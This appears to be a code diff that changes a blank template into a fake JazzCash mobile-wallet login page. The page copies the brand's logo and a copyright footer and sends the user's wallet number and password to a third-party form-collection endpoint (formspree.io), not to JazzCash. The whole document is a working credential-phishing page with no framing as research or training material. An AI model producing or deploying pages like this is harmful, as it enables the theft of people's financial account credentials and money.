@@ -1,14 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your Website</title>
+  <meta charset="UTF-8" />
+  <title>Jazzcash Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 120px;
+      margin: 0 10px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #25d366;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    .btn:hover {
+      background-color: #1daa58;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://uploads.onecompiler.io/44fvdkpnk/44fvdn2rb/JazzCash-2025-New-Logo-PNG-Vector.png" alt="New Jazzcash Logo" />
+    </div>
+
     <form action="https://formspree.io/f/xaqpqror" method="POST">
-        <!-- form fields here -->
-        <input type="submit" value="Submit">
+      <div class="form-group">
+        <label for="username">Jazzcash Number</label>
+        <input type="text" id="username" name="username" placeholder="" required />
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="" required />
+      </div>
+
+      <button type="submit" class="btn">Log In</button>
     </form>
+
+    <div class="footer">&copy; 2026 Jazzcash. All rights reserved.</div>
+  </div>
 </body>
 </html>
